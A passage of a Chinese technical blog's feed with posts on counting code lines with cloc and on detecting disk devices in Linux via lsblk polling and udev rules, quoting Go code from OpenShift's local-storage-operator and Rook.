        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;在当前 Kubernetes 生态中，生命周期管理相关工具官方的有 kubeadm、kubespray（部署集群部分通过 kubeadm） 
      
    
    </summary>
    
    
      <category term="Kubernetes" scheme="https://zdyxry.github.io/tags/Kubernetes/"/>
    
  </entry>
  
  <entry>
    <title>代码统计工具 cloc 基本使用</title>
    <link href="https://zdyxry.github.io/2019/08/09/%E4%BB%A3%E7%A0%81%E7%BB%9F%E8%AE%A1%E5%B7%A5%E5%85%B7-cloc-%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <id>https://zdyxry.github.io/2019/08/09/代码统计工具-cloc-基本使用/</id>
    <published>2019-08-09T11:35:14.000Z</published>
    <updated>2019-08-09T11:35:56.877Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在看一个新项目的时候，通常我都会了解下这个项目的代码量，然后心里给个预期，大概需要多久了解这个项目。</p><h2 id="wc"><a href="#wc" class="headerlink" title="wc"></a>wc</h2><p>在以前，我一般都是使用 <code>find</code> 配合 <code>wc</code> 来完成，比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@yiran-workstation:/tmp/cloc </span><br><span class="line"> $ find . -name <span class="string">"*.go"</span> | xargs wc -l &#123;&#125; </span><br><span class="line">  81 ./installer.go</span><br><span class="line">  81 total</span><br></pre></td></tr></table></figure><p>显示有一个 <code>installer.go</code> 的文件，一共有 81行。但是这里有个问题，就是 wc 是不会统计代码里面的具体内容的，比如注释、空白行等。</p><p>这时候我们就需要一个更高级的工具了： <code>cloc</code></p><h2 id="cloc"><a href="#cloc" class="headerlink" title="cloc"></a>cloc</h2><p><a href="https://github.com/AlDanial/cloc" target="_blank" rel="noopener">cloc</a> 是一个 Perl 语言实现的项目，用途就像它的名字全称：Count Lines of Code。</p><p>使用方法的话最简单的直接加上项目路径：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">root@yiran-workstation:~/go/src/github.com/kubermatic/kubeone </span><br><span class="line">master ✗ $ <span class="built_in">pwd</span>        </span><br><span class="line">/root/go/src/github.com/kubermatic/kubeone</span><br><span class="line">root@yiran-workstation:~/go/src/github.com/kubermatic/kubeone </span><br><span class="line">master ✗ $ cloc .                   </span><br><span class="line">     292 text files.</span><br><span class="line">     274 unique files.                                          </span><br><span class="line">      78 files ignored.</span><br><span class="line"></span><br><span class="line">github.com/AlDanial/cloc v 1.70  T=0.80 s (269.1 files/s, 32223.3 lines/s)</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Language                     files          blank        comment           code</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Go                             122           2861           2791          14374</span><br><span class="line">Markdown                        38           1003              0           3172</span><br><span class="line">YAML                            41             14            158            524</span><br><span class="line">Bourne Shell                     5             44             89            206</span><br><span class="line">Python                           4             66             76            186</span><br><span class="line">XML                              4              0              0            100</span><br><span class="line">make                             1             17             13             52</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">SUM:                           215           4005           3127          18614</span><br><span class="line">-------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><p>可以看到统计结果，其中默认会按照语言分类。</p><p>如果是 Golang 的项目，且使用了 vendor ，那么可以通过 <code>--exclude-dir</code> 来过滤掉某些路径：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">aster ✗ $ cloc . </span><br><span class="line">    3304 text files.</span><br><span class="line">    3170 unique files.                                          </span><br><span class="line">     429 files ignored.</span><br><span class="line"></span><br><span class="line">github.com/AlDanial/cloc v 1.70  T=12.40 s (232.7 files/s, 101850.0 lines/s)</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">Language                      files          blank        comment           code</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">Go                             2501         101422         113437        1007168</span><br><span class="line">Markdown                        108           2688              0           6786</span><br><span class="line">Protocol Buffers                 53           3006           9076           5133</span><br><span class="line">YAML                            108            305            377           4032</span><br><span class="line">Bourne Shell                     38            381            839           1897</span><br><span class="line">JSON                              7              0              0           1748</span><br><span class="line">Assembly                         35            271            320           1603</span><br><span class="line">Python                            5            277            113            588</span><br><span class="line">make                             23            165            162            556</span><br><span class="line">Bourne Again Shell                3             45             56            378</span><br><span class="line">XML                               4              0              0            106</span><br><span class="line">C                                 1              8              7             24</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">SUM:                           2886         108568         124387        1030019</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">root@yiran-workstation:~/go/src/github.com/kubernetes-sigs/cluster-api-provider-vsphere </span><br><span class="line">master ✗ $ ls    </span><br><span class="line">boilerplate.go.txt  cmd                 config           Dockerfile  go.mod  hack     Makefile  OWNERS_ALIASES  PROJECT    RELEASE.md  SECURITY_CONTACTS</span><br><span class="line">build               code-of-conduct.md  CONTRIBUTING.md  docs        go.sum  LICENSE  OWNERS    pkg             README.md  scripts     vendor</span><br><span class="line">root@yiran-workstation:~/go/src/github.com/kubernetes-sigs/cluster-api-provider-vsphere </span><br><span class="line">master ✗ $ cloc . --exclude-dir=vendor</span><br><span class="line">     234 text files.</span><br><span class="line">     234 unique files.                                          </span><br><span class="line">      73 files ignored.</span><br><span class="line"></span><br><span class="line">github.com/AlDanial/cloc v 1.70  T=0.55 s (294.2 files/s, 26466.9 lines/s)</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Language                     files          blank        comment           code</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Go                              64           1110           1355           5106</span><br><span class="line">YAML                            37            150            302           1907</span><br><span class="line">Bourne Shell                    22            256            475           1125</span><br><span class="line">Markdown                        17            332              0            895</span><br><span class="line">Python                           5            277            113            588</span><br><span class="line">make                             9             57            112            177</span><br><span class="line">JSON                             4              0              0            131</span><br><span class="line">XML                              4              0              0            106</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">SUM:                           162           2182           2357          10035</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">root@yiran-workstation:~/go/src/github.com/kubernetes-sigs/cluster-api-provider-vsphere </span><br><span class="line">master ✗ $</span><br></pre></td></tr></table></figure><p>有时候仅仅按照语言分类还不够，我们想看到具体的那些文件代码量比较大，可以使用 <code>--by-file</code> 参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">root@yiran-workstation:~/go/src/github.com/kubermatic/kubeone </span><br><span class="line">master ✗ $ cloc . --by-file |head -n 30</span><br><span class="line">     292 text files.</span><br><span class="line">     274 unique files.                                          </span><br><span class="line">      78 files ignored.</span><br><span class="line"></span><br><span class="line">github.com/AlDanial/cloc v 1.70  T=0.70 s (307.5 files/s, 36823.9 lines/s)</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------</span><br><span class="line">File                                                                             blank        comment           code</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------</span><br><span class="line">./pkg/templates/machinecontroller/deployment.go                                     52             24            762</span><br><span class="line">./pkg/apis/kubeone/v1alpha1/zz_generated.conversion.go                              86             54            614</span><br><span class="line">./pkg/apis/kubeone/validation/validation_test.go                                    22             12            530</span><br><span class="line">./pkg/cmd/config.go                                                                 81             42            477</span><br><span class="line">./pkg/apis/kubeadm/v1beta2/zz_generated.deepcopy.go                                 53             60            443</span><br><span class="line">./pkg/apis/kubeadm/v1beta1/zz_generated.deepcopy.go                                 53             60            439</span><br><span class="line">./pkg/templates/weave/weave-net.go                                                  32             13            433</span><br><span class="line">./pkg/config/cluster.go                                                             80             69            417</span><br><span class="line">./pkg/terraform/config.go                                                           76             30            368</span><br><span class="line">./pkg/templates/canal/daemonset.go                                                   9             42            344</span><br><span class="line">./pkg/yamled/document_test.go                                                      113             15            344</span><br><span class="line">./pkg/apis/kubeone/v1alpha1/zz_generated.deepcopy.go                                47             53            340</span><br><span class="line">./pkg/apis/kubeone/zz_generated.deepcopy.go                                         47             53            340</span><br><span class="line">./pkg/templates/machinecontroller/webhook.go                                        35             22            332</span><br><span class="line">./pkg/installer/installation/prerequisites.go                                       73             21            281</span><br><span class="line">./pkg/templates/canal/prerequisites.go                                              16             40            257</span><br><span class="line">./pkg/upgrader/upgrade/preflight_checks.go                                          44             30            247</span><br><span class="line">./pkg/yamled/document.go                                                            70             31            240</span><br><span class="line">./pkg/upgrader/upgrade/preflight_checks_test.go                                     14             12            237</span><br><span class="line">./pkg/templates/metricsserver/deployment.go                                         22             13            227</span><br><span class="line">./pkg/templates/externalccm/packet.go                                               20             12            222</span><br><span class="line">./docs/quickstart-vsphere.md                                                        59              0            222</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;在看一个新项目的时候，通常我都会了解下这个项目的代码量，然后心里给个预期，大概需要多久了解这个项目。&lt;/p&gt;
&lt;h2 id=&quot;wc&quot;&gt;&lt;a 
      
    
    </summary>
    
    
      <category term="tools" scheme="https://zdyxry.github.io/tags/tools/"/>
    
  </entry>
  
  <entry>
    <title>Linux 下磁盘设备自动发现方式</title>
    <link href="https://zdyxry.github.io/2019/08/02/Linux-%E4%B8%8B%E7%A3%81%E7%9B%98%E8%AE%BE%E5%A4%87%E8%87%AA%E5%8A%A8%E5%8F%91%E7%8E%B0%E6%96%B9%E5%BC%8F/"/>
    <id>https://zdyxry.github.io/2019/08/02/Linux-下磁盘设备自动发现方式/</id>
    <published>2019-08-02T15:10:04.000Z</published>
    <updated>2019-08-02T15:11:01.335Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>如果在 PC 上安装过 Linux，那么通常会遇到过硬件设备无法发现的问题，这类问题最终都可以通过 google 来解决掉。那么当我们在服务器场景下，如何做到设备自动发现且在设备发现后执行某些动作呢？</p><p>最近看了几个关于存储系统的 Operator 部分实现，记录一下。</p><h2 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h2><p>最简单的肯定是我们写一个循环，永远检测我们要发现的设备，比如 lsblk 可以列举当前服务器所有 block 设备，那么我们就在循环内部执行 lsblk，diff 每次执行的结果，如果有新的设备，那么执行某些操作。</p><p>lsblk 是通过读取 /sys/block 下的具体目录判断的，那么我么也可以直接读取该路径下的目录来实现。</p><p>如果是网络设备也是一样，我们可以在循环内部执行 <code>ip link list</code> 来获取所有网络设备。</p><h2 id="UDEV"><a href="#UDEV" class="headerlink" title="UDEV"></a>UDEV</h2><p>照常先引用维基百科的解释：</p><blockquote><p>udev 是Linux kernel 2.6系列的设备管理器。它主要的功能是管理/dev目錄底下的设备节点。它同时也是用来接替devfs及hotplug的功能，这意味着它要在添加/删除硬件时处理/dev目录以及所有用户空间的行为，包括加载firmware时。</p></blockquote><p>如果你的 OS 是通过 systemd 来管理所有进程的话，那么可以发现一个服务叫做 <code>systemd-udevd</code> ，这个是 udev 的守护进程:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@node90 19:58:10 ~]<span class="variable">$systemctl</span> status systemd-udevd</span><br><span class="line">● systemd-udevd.service - udev Kernel Device Manager</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/systemd-udevd.service; static; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since Fri 2019-06-14 15:25:55 CST; 1 months 18 days ago</span><br><span class="line">     Docs: man:systemd-udevd.service(8)</span><br><span class="line">           man:udev(7)</span><br><span class="line"> Main PID: 698 (systemd-udevd)</span><br><span class="line">   Status: <span class="string">"Processing with 56 children at max"</span></span><br><span class="line">    Tasks: 1</span><br><span class="line">   Memory: 24.0M</span><br><span class="line">   CGroup: /system.slice/systemd-udevd.service</span><br><span class="line">           └─698 /usr/lib/systemd/systemd-udevd</span><br><span class="line"></span><br><span class="line">Aug 02 10:29:17 node90 python[4395]: detected unhandled Python exception <span class="keyword">in</span> <span class="string">'/usr/lib/python2.7/site-packages/cpuinfo/cpuinfo.py'</span></span><br><span class="line">Aug 02 10:29:17 node90 python[4395]: can<span class="string">'t communicate with ABRT daemon, is it running? [Errno 2] No such file or directory</span></span><br><span class="line"><span class="string">Warning: Journal has been rotated since unit was started. Log output is incomplete or unavailable.</span></span><br></pre></td></tr></table></figure><p>udev 可以让我们对硬件的使用限制大大减少，除了常见的硬件发现，还有一个场景就是网卡改名，比如 82599 网卡，在 CentOS 上大概率识别为 <code>enp4s0f1</code> 之类的网卡名，如果我们想要统一服务器网卡名称，那么我们可以通过设置 udev 规则，匹配 mac 地址来做到，这里不细说。</p><p>我们来说说 udev 自动发现设备。udev 提供了完整的工具集，可以共我们使用，比如 udevadm：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@node 20:02:41 ~]<span class="variable">$udevadm</span> --<span class="built_in">help</span></span><br><span class="line">udevadm [--<span class="built_in">help</span>] [--version] [--debug] COMMAND [COMMAND OPTIONS]</span><br><span class="line"></span><br><span class="line">Send control commands or <span class="built_in">test</span> the device manager.</span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line">  info          Query sysfs or the udev database</span><br><span class="line">  trigger       Request events from the kernel</span><br><span class="line">  settle        Wait <span class="keyword">for</span> pending udev events</span><br><span class="line">  control       Control the udev daemon</span><br><span class="line">  monitor       Listen to kernel and udev events</span><br><span class="line">  <span class="built_in">test</span>          Test an event run</span><br><span class="line">  <span class="built_in">test</span>-builtin  Test a built-in <span class="built_in">command</span></span><br></pre></td></tr></table></figure><p>我们可以通过 udevadm 来查看硬件设备的具体信息，也可以通过 udevadm 来进行显示的设备监控。</p><p>除了通过 udevadm 命令，我们还可以通过编写 udev 配置文件来实现设备发现后的具体动作，在 <code>/etc/udev/rules.d/</code> 路径下可以防止我们自己的配置文件。</p><p>比如我们想实现功能：节点上插入磁盘后，执行某条命令，那么我们可以这么定义：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@node90 20:05:21 rules.d]<span class="variable">$pwd</span></span><br><span class="line">/etc/udev/rules.d</span><br><span class="line">[root@node 20:06:29 rules.d]<span class="variable">$cat</span> 98-disk-udev.rules </span><br><span class="line">KERNEL==<span class="string">"sd[a-z]"</span>, SUBSYSTEM==<span class="string">"block"</span>, ACTION==<span class="string">"add"</span>, RUN+=<span class="string">"echo add"</span></span><br><span class="line"></span><br><span class="line">KERNEL==<span class="string">"sd[a-z]"</span>, SUBSYSTEM==<span class="string">"block"</span>, ACTION==<span class="string">"remove"</span>, RUN+=<span class="string">"echo remove"</span></span><br></pre></td></tr></table></figure><p>这个规则具体含义为：</p><ul><li><p>当检测到设备 <code>sd[a-z]</code> , 类型为 <code>block</code>且动作为 <code>add</code> ，那么执行 <code>echo add</code> 操作。</p></li><li><p>当检测到设备 <code>sd[a-z]</code> ，类型为 <code>block</code>且动作为 <code>remove</code> ，那么执行 <code>echo add</code> 操作。</p></li></ul><p>我们来看一个具体的例子，执行 <code>udevadm monito</code> 来监控节点设备，然后插入一块 scsi 磁盘：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[root@node 20:14:04 rules.d]<span class="variable">$udevadm</span> monitor</span><br><span class="line">monitor will <span class="built_in">print</span> the received events <span class="keyword">for</span>:</span><br><span class="line">UDEV - the event <span class="built_in">which</span> udev sends out after rule processing</span><br><span class="line">KERNEL - the kernel uevent</span><br><span class="line">KERNEL[4250923.838205] add      /devices/pci0000:00/0000:00:1f.2/ata6/host6/target6:0:0 (scsi)</span><br><span class="line">KERNEL[4250923.838232] add      /devices/pci0000:00/0000:00:1f.2/ata6/host6/target6:0:0/6:0:0:0 (scsi)</span><br><span class="line">KERNEL[4250923.838241] add      /devices/pci0000:00/0000:00:1f.2/ata6/host6/target6:0:0/6:0:0:0/scsi_disk/6:0:0:0 (scsi_disk)</span><br><span class="line">KERNEL[4250923.838248] add      /devices/pci0000:00/0000:00:1f.2/ata6/host6/target6:0:0/6:0:0:0/scsi_device/6:0:0:0 (scsi_device)</span><br><span class="line">KERNEL[4250923.838344] add      /devices/pci0000:00/0000:00:1f.2/ata6/host6/target6:0:0/6:0:0:0/scsi_generic/sg6 (scsi_generic)</span><br><span class="line">KERNEL[4250923.838355] add      /devices/virtual/bdi/8:96 (bdi)</span><br><span class="line">KERNEL[4250923.838364] add      /devices/pci0000:00/0000:00:1f.2/ata6/host6/target6:0:0/6:0:0:0/bsg/6:0:0:0 (bsg)</span><br><span class="line">UDEV  [4250923.844166] add      /devices/virtual/bdi/8:96 (bdi)</span><br><span class="line">UDEV  [4250923.844180] add      /devices/pci0000:00/0000:00:1f.2/ata6/host6/target6:0:0 (scsi)</span><br><span class="line">UDEV  [4250923.844189] add      /devices/pci0000:00/0000:00:1f.2/ata6/host6/target6:0:0/6:0:0:0 (scsi)</span><br><span class="line">UDEV  [4250923.844196] add      /devices/pci0000:00/0000:00:1f.2/ata6/host6/target6:0:0/6:0:0:0/scsi_device/6:0:0:0 (scsi_device)</span><br><span class="line">UDEV  [4250923.844203] add      /devices/pci0000:00/0000:00:1f.2/ata6/host6/target6:0:0/6:0:0:0/scsi_disk/6:0:0:0 (scsi_disk)</span><br><span class="line">UDEV  [4250923.848018] add      /devices/pci0000:00/0000:00:1f.2/ata6/host6/target6:0:0/6:0:0:0/scsi_generic/sg6 (scsi_generic)</span><br><span class="line">UDEV  [4250923.851041] add      /devices/pci0000:00/0000:00:1f.2/ata6/host6/target6:0:0/6:0:0:0/bsg/6:0:0:0 (bsg)</span><br><span class="line">KERNEL[4250923.882845] add      /devices/pci0000:00/0000:00:1f.2/ata6/host6/target6:0:0/6:0:0:0/block/sdg (block)</span><br><span class="line">KERNEL[4250923.882863] add      /devices/pci0000:00/0000:00:1f.2/ata6/host6/target6:0:0/6:0:0:0/block/sdg/sdg1 (block)</span><br><span class="line">UDEV  [4250928.290659] add      /devices/pci0000:00/0000:00:1f.2/ata6/host6/target6:0:0/6:0:0:0/block/sdg (block)</span><br><span class="line">UDEV  [4250928.379634] add      /devices/pci0000:00/0000:00:1f.2/ata6/host6/target6:0:0/6:0:0:0/block/sdg/sdg1 (block)</span><br></pre></td></tr></table></figure><p>可以看到 udev 监控到了设备名称，设备 pci id 以及设备触发的动作，这里与我们定义的规则相对应。</p><h2 id="具体使用"><a href="#具体使用" class="headerlink" title="具体使用"></a>具体使用</h2><h3 id="命令行-1"><a href="#命令行-1" class="headerlink" title="命令行"></a>命令行</h3><p>在 OpenShift 的 local storage operator 中，是通过不断的执行 lsblk 比较结果来判断的，相关代码如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Run and create disk config</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *DiskMaker)</span> <span class="title">Run</span><span class="params">(stop &lt;-<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">ticker := time.NewTicker(checkDuration)</span><br><span class="line"><span class="keyword">defer</span> ticker.Stop()</span><br><span class="line"></span><br><span class="line">err := os.MkdirAll(d.symlinkLocation, <span class="number">0755</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">klog.Errorf(<span class="string">"error creating local-storage directory %s: %v"</span>, d.symlinkLocation, err)</span><br><span class="line">os.Exit(<span class="number">-1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-ticker.C:</span><br><span class="line">diskConfig, err := d.loadConfig()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">klog.Errorf(<span class="string">"error loading configuration: %v"</span>, err)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">d.symLinkDisks(diskConfig)</span><br><span class="line"><span class="keyword">case</span> &lt;-stop:</span><br><span class="line">klog.Infof(<span class="string">"exiting, received message on stop channel"</span>)</span><br><span class="line">os.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *DiskMaker)</span> <span class="title">symLinkDisks</span><span class="params">(diskConfig *DiskConfig)</span></span> &#123;</span><br><span class="line">cmd := exec.Command(<span class="string">"lsblk"</span>, <span class="string">"--list"</span>, <span class="string">"-o"</span>, <span class="string">"NAME,MOUNTPOINT"</span>, <span class="string">"--noheadings"</span>)</span><br><span class="line"><span class="keyword">var</span> out bytes.Buffer</span><br><span class="line"><span class="keyword">var</span> err error</span><br><span class="line">cmd.Stdout = &amp;out</span><br><span class="line">err = cmd.Run()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">msg := fmt.Sprintf(<span class="string">"error running lsblk: %v"</span>, err)</span><br><span class="line">e := newEvent(ErrorRunningBlockList, msg, <span class="string">""</span>)</span><br><span class="line">d.eventSync.report(e, d.localVolume)</span><br><span class="line">klog.Errorf(msg)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">deviceSet, err := d.findNewDisks(out.String())</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">msg := fmt.Sprintf(<span class="string">"error reading blocklist: %v"</span>, err)</span><br><span class="line">e := newEvent(ErrorReadingBlockList, msg, <span class="string">""</span>)</span><br><span class="line">d.eventSync.report(e, d.localVolume)</span><br><span class="line">klog.Errorf(msg)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(deviceSet) == <span class="number">0</span> &#123;</span><br><span class="line">klog.V(<span class="number">3</span>).Infof(<span class="string">"unable to find any new disks"</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="UDEV-1"><a href="#UDEV-1" class="headerlink" title="UDEV"></a>UDEV</h3><p>在 Rook 项目中，除了通过 lsblk 来获取设备，还监控了 udev 规则，具体代码如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// Scans `udevadm monitor` output for block sub-system events. Each line of</span></span><br><span class="line"><span class="comment">// output matching a set of substrings is sent to the provided channel. An event</span></span><br><span class="line"><span class="comment">// is returned if it passes any matches tests, and passes all exclusion tests.</span></span><br><span 